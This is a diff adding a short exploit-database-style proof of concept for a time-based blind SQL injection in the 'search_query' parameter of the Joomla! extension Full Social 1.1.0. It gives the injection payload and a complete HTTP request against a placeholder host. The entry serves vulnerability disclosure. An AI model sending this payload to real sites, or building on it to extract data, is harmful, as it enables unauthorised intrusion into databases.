@@ -1,0 +1,31 @@
+# Exploit Title: Joomla! extension Full Social 1.1.0 - 'search_query' SQL
+Injection
+# Date: 2018-05-28
+# Exploit Author: L0RD or borna.nematzadeh123@gmail.com
+# Software Link: https://extensions.joomla.org/extension/full-social/
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Version: 1.1.0
+# Tested on: Win 10
+===================================================
+# POC : SQLi
+
+# Parameter : search_query
+# Type : Time-based blind
+# Payload : 1%' AND SLEEP(10)%23
+
+# Request
+============
+GET
+/en/search?controller=search&orderby=position&orderway=desc&search_query=1%25%27+AND+SLEEP%2810%29%23&submit_search=
+HTTP/1.1
+Host: www.site.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.site.com/en/
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+===================================================
